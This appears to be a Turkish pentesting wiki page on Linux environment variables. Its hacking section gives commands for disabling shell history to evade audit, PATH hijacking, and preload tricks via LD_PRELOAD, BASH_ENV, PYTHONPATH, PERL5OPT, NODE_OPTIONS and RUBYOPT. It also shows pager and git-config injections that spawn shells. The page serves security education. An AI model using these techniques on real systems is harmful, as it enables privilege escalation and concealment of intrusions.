# Linux Ortam Değişkenleri

## Global değişkenler

Global değişkenler **alt süreçler** tarafından devralınır.

Şunları yaparak mevcut oturumunuz için bir global değişken oluşturabilirsiniz:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Bu değişkene mevcut oturumlarınız ve bunların alt işlemleri tarafından erişilebilir.

Bir değişkeni şu şekilde **kaldırabilirsiniz**:
```bash
unset MYGLOBAL
```
## Yerel değişkenler

**Yerel değişkenlere** yalnızca **mevcut shell/script** tarafından **erişilebilir**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Mevcut değişkenleri listeleme
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` içeriği **NUL ile ayrılmıştır**; bu nedenle aşağıdaki varyantlar genellikle daha kolay okunur:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Inherited ortamlar içinde **credentials** veya **interesting service configuration** arıyorsanız [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) bölümüne de göz atın.

## Common variables

Kaynak: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** tarafından kullanılan ekran. Bu değişken genellikle **:0.0** olarak ayarlanır; bu, mevcut bilgisayardaki ilk ekran anlamına gelir.
- **EDITOR** – kullanıcının tercih ettiği metin düzenleyicisi.
- **HISTFILESIZE** – history file içinde bulunan maksimum satır sayısı.
- **HISTSIZE** – kullanıcı oturumunu sonlandırdığında history file'a eklenen satır sayısı.
- **HOME** – home directory'niz.
- **HOSTNAME** – bilgisayarın hostname'i.
- **LANG** – geçerli diliniz.
- **MAIL** – kullanıcının mail spool konumu. Genellikle **/var/spool/mail/USER**.
- **MANPATH** – manual page'leri aramak için kullanılacak directory listesi.
- **OSTYPE** – işletim sistemi türü.
- **PS1** – bash içindeki varsayılan prompt.
- **PATH** – yalnızca dosyanın adını belirterek ve relative veya absolute path kullanmadan çalıştırmak istediğiniz binary file'ları içeren tüm directory'lerin path'ini depolar.
- **PWD** – geçerli working directory.
- **SHELL** – geçerli command shell'in path'i (örneğin, **/bin/bash**).
- **TERM** – geçerli terminal türü (örneğin, **xterm**).
- **TZ** – time zone'unuz.
- **USER** – geçerli username'iniz.

## Interesting variables for hacking

Her değişken aynı derecede kullanışlı değildir. Offensive açıdan, **search path**'leri, **startup file**'ları, **dynamic linker behavior**'ı veya **audit/logging** davranışını değiştiren değişkenlere öncelik verin.

### **HISTFILESIZE**

**Oturumunuzu sonlandırdığınızda** **history file** (\~/.bash_history) **0 satıra truncate edilecek** şekilde **bu değişkenin değerini 0 olarak değiştirin**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Komutların **bellek içi geçmişte tutulmaması** ve **geçmiş dosyasına** (\~/.bash_history) geri yazılmaması için bu değişkenin **değerini 0** olarak değiştirin.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

If the **value of this variable is set to `ignorespace` or `ignoreboth`**, başına ekstra bir boşluk eklenmiş herhangi bir komut geçmişe kaydedilmez.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**history file**'ı **`/dev/null`**'a yönlendirin veya tamamen unset edin. Bu, yalnızca history boyutunu değiştirmekten genellikle daha güvenilirdir.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Process'ler, **http veya https** üzerinden internete bağlanmak için burada belirtilen **proxy**'yi kullanır.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy ve no_proxy

- `all_proxy`: bunu dikkate alan araçlar/protokoller için varsayılan proxy.
- `no_proxy`: doğrudan bağlanması gereken, proxy'yi bypass eden liste (host'lar/domain'ler/CIDR'ler).
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Hem küçük harfli hem de büyük harfli varyantlar, kullanılan araca bağlı olarak kullanılabilir (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

İşlemler, **bu env değişkenlerinde** belirtilen sertifikalara güvenir. Bu, **`curl`**, **`git`**, Python HTTP istemcileri veya paket yöneticileri gibi araçların saldırganın kontrolündeki bir CA'ya güvenmesini sağlamak için kullanışlıdır (örneğin, bir interception proxy'sinin meşru görünmesini sağlamak için).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ayrıcalıklı bir wrapper/script, komutları **absolute paths** olmadan çalıştırırsa, `PATH` içindeki saldırganın kontrol ettiği ilk dizin kazanır. Bu, `sudo`, cron jobs, shell wrappers ve özel SUID helpers içindeki birçok **PATH hijack** tekniğinin temelindeki primitive'dir. `env_keep+=PATH`, zayıf `secure_path` veya `tar`, `service`, `cp`, `python` gibi komutları adlarıyla çağıran wrapper'ları arayın.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Tam ayrıcalık yükseltme zincirleri için `PATH` kötüye kullanılıyorsa [Linux Privilege Escalation](linux-privilege-escalation/README.md) sayfasına bakın.

### **HOME & XDG_CONFIG_HOME**

`HOME` yalnızca bir dizin başvurusu değildir: birçok araç **dotfiles**, **plugins** ve **kullanıcıya özel yapılandırmayı** `$HOME` veya `$XDG_CONFIG_HOME` konumlarından otomatik olarak yükler. Ayrıcalıklı bir iş akışı bu değerleri koruyorsa, **config injection** binary hijacking işleminden daha kolay olabilir.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
İlgi çekici hedefler arasında `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` ve `.terraformrc` gibi tool-specific dosyalar bulunur.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Bu değişkenler **dynamic linker**'ı etkiler:

- `LD_PRELOAD`: Ek shared object'lerin önce yüklenmesini zorlar.
- `LD_LIBRARY_PATH`: Library arama dizinlerini öne ekler.
- `LD_AUDIT`: Library loading ve symbol resolution işlemlerini gözlemleyen auditor library'lerini yükler.

Ayrıcalıklı bir komut bu değişkenleri koruyorsa **hooking**, **instrumentation** ve **privilege escalation** için son derece değerlidirler. **secure-execution** modunda (`AT_SECURE`; ör. setuid/setgid/capabilities), loader bu değişkenlerin çoğunu kaldırır veya kısıtlar. Ancak bu erken loader aşamasındaki parser bug'ları, hedef programdan **önce** çalıştıkları için hâlâ yüksek etkiye sahiptir.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`, glibc davranışını erken aşamada (örneğin allocator ayarlarını) değiştirir ve exploit lablarında oldukça kullanışlıdır. **Dynamic loader** bunu çok erken ayrıştırdığı için güvenlik açısından da önem taşır. 2023'teki **Looney Tunables** bug'ı, loader tarafından ayrıştırılan tek bir environment variable'ın SUID programlarına karşı **local privilege-escalation primitive** haline gelebileceğini iyi bir şekilde hatırlattı.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV ve ENV**

**Bash** **etkileşimsiz** olarak başlatılırsa, hedef scripti çalıştırmadan önce `BASH_ENV` değişkenini kontrol eder ve belirtilen dosyayı source eder. Bash `sh` olarak çağrıldığında veya POSIX tarzı etkileşimli modda çalıştığında `ENV` değişkenine de bakılabilir. Bu, environment saldırganın kontrolündeyse bir shell wrapper'ı code execution'a dönüştürmenin klasik bir yoludur.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash, **gerçek/etkin kimlikler farklı olduğunda** bu başlangıç dosyalarını yok sayar; `-p`, etkin kimliği korur ancak bu başlangıç dosyalarını etkinleştirmez; dolayısıyla kesin davranış, wrapper'ın shell'i nasıl başlattığına bağlıdır. Bash'i başlatmadan **önce** `setuid()`/`setgid()` çağıran ayrıcalıklı wrapper'lara dikkat edin: Kimlikler yeniden eşleştiğinde Bash, aksi durumda yok sayacağı `BASH_ENV`, `ENV` ve ilgili shell durumuna güvenebilir.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Bu değişkenler Python'ın nasıl başlatılacağını değiştirir:

- `PYTHONPATH`: import arama yollarını öne ekler.
- `PYTHONHOME`: standart kütüphane ağacının konumunu değiştirir.
- `PYTHONSTARTUP`: etkileşimli istemden önce bir dosyayı çalıştırır.
- `PYTHONINSPECT=1`: bir script tamamlandıktan sonra etkileşimli moda geçer.

Denetlenebilir bir ortamla Python çağıran bakım script'lerine, debugger'lara, shell'lere ve wrapper'lara karşı kullanışlıdırlar. `python -E` ve `python -I`, tüm `PYTHON*` değişkenlerini yok sayar.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Yakın tarihli gerçek dünya örneklerinden biri, Ubuntu/Debian sistemlerindeki 2024 **needrestart** LPE'siydi: root-owned scanner, ayrıcalıksız bir process'in `PYTHONPATH` değerini `/proc/<PID>/environ` üzerinden kopyaladı ve ardından Python'ı çalıştırdı. Yayınlanan exploit, attacker-controlled path içine `importlib/__init__.so` yerleştirdi; böylece Python, helper'ın hard-coded script'i önem kazanmadan önce, kendi initialization süreci sırasında attacker code çalıştırdı.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl'in de benzer şekilde kullanışlı startup variable'ları vardır:

- `PERL5LIB`: library directory'lerini prepend eder.
- `PERL5OPT`: switch'leri her `perl` command line'ında varmış gibi inject eder.

Bu, **automatic module loading** işlemini zorlayabilir veya target script ilginç bir şey yapmadan önce interpreter behavior'ını değiştirebilir. Perl, **taint / setuid / setgid** context'lerinde bu variable'ları yok sayar; ancak normal root-run wrapper'lar, CI job'ları, installer'lar ve custom sudoers rule'ları için hâlâ büyük önem taşırlar.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS`, ortamı devralan her `node` process'ine **Node.js CLI flags** ekler. Bu özellik, sonunda Node çağıran wrapper'lara, CI job'larına, Electron helper'larına ve sudo kurallarına karşı kullanılmasını sağlar. Saldırı amaçlı en ilgi çekici flag'ler genellikle şunlardır:

- `--require <file>`: hedef script'ten önce bir CommonJS dosyasını preload eder.
- `--import <module>`: hedef script'ten önce bir ES module'ü preload eder.

Node, bazı tehlikeli flag'lerin `NODE_OPTIONS` içinde kullanılmasını reddeder; ancak `--require` ve `--import` açıkça izin verilen flag'lerdir ve normal command-line argument'larından **önce** işlenir.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
`NODE_OPTIONS` değerini dolaylı olarak ayarlayan remote gadget chain'ler için (örneğin prototype-pollution ile RCE), [bu diğer sayfaya](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) bakın.

### **RUBYLIB & RUBYOPT**

Ruby, aynı türde bir startup kötüye kullanımı olanağı sunar:

- `RUBYLIB`: Dizinleri Ruby'nin load path'inin başına ekler.
- `RUBYOPT`: Her `ruby` çalıştırmasına `-r` gibi command-line seçenekleri enjekte eder.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024 **needrestart** güvenlik açıkları, bunun yalnızca bir lab tekniği olmadığını gösterdi: `PYTHONPATH` abuse'a karşı savunmasız olan aynı root-owned helper, attacker-controlled bir `RUBYLIB` kullanarak Ruby çalıştırmaya ve `enc/encdb.so` dosyasını attacker directory içinden yüklemeye de zorlanabiliyordu.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Bazı araçlar environment'dan yalnızca bir path okumaz; değeri bir **shell**'e, bir **editor**'e veya bir **input preprocessor**'a iletir. Bu nedenle aşağıdaki variable'lar, privileged bir wrapper `git`, `man`, `less` veya benzer text viewer'ları çalıştırdığında özellikle ilgi çekicidir:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command'ını seçer.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: genellikle argument'larla birlikte editor command'ını seçer.
- `LESSOPEN`, `LESSCLOSE`: `less` bir dosya açtığında çalışan pre/post-processor'ları tanımlar.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git ayrıca diske dokunmadan **env-only config injection** işlemini `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` ve `GIT_CONFIG_VALUE_<n>` aracılığıyla destekler:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Post-exploitation perspektifinden, devralınan ortamların genellikle **kimlik bilgileri**, **proxy ayarları**, **service token'ları** veya **cloud anahtarları** içerdiğini de unutmayın. `/proc/<PID>/environ` ve `systemd` `Environment=` araştırması için [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) sayfasına bakın.

### PS1

Prompt'unuzun görünümünü değiştirin.

[**Bu bir örnektir**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Bu bir örnektir](<../images/image (897).png>)

Normal kullanıcı:

![PERL5OPT & PERL5LIB - PS1: Arka plana alınmış bir, iki ve üç job](<../images/image (740).png>)

Arka plana alınmış bir, iki ve üç job:

![PERL5OPT & PERL5LIB - PS1: Arka plana alınmış bir, iki ve üç job](<../images/image (145).png>)

Bir arka plan job'ı, durdurulmuş bir job ve son komut doğru şekilde tamamlanmadı:

![PERL5OPT & PERL5LIB - PS1: Bir arka plan job'ı, durdurulmuş bir job ve son komut doğru şekilde tamamlanmadı](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash Başlangıç Dosyaları](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart içindeki LPE'ler](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Yaygın ortam değişkenleri - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc'nin ld.so'sunda Local Privilege Escalation - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
{{#include ../../banners/hacktricks-training.md}}
